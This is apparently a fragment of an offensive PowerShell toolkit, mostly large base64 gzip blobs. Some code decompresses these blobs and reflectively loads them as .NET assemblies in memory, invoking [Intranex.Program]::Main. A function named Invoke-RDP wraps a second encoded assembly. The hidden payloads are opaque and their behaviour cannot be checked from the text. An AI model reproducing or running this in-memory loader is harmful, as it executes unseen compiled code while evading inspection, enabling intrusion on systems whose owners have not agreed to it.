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"))
    $gzipStream = New-Object IO.Compression.GzipStream($a, [IO.Compression.CompressionMode]::Decompress)
    $memStream = New-Object System.IO.MemoryStream
    $gzipStream.CopyTo($memStream)
    $reflectedAssembly = [System.Reflection.Assembly]::Load($memStream.ToArray())
    $currentConsoleOutput = [Console]::Out
    $textWriter = New-Object IO.StringWriter
    [Console]::SetOut($textWriter)
    [Intranex.Program]::Main([string[]]$args)
    [Console]::SetOut($currentConsoleOutput)
    $textWriter.ToString()
  
}
'@

$Global:irdp = @'
function Invoke-RDP{
    Param ([String]$pRDP = " ")
    
    $memoryStreamInput = New-Object IO.MemoryStream(, [Convert]::FromBase64String("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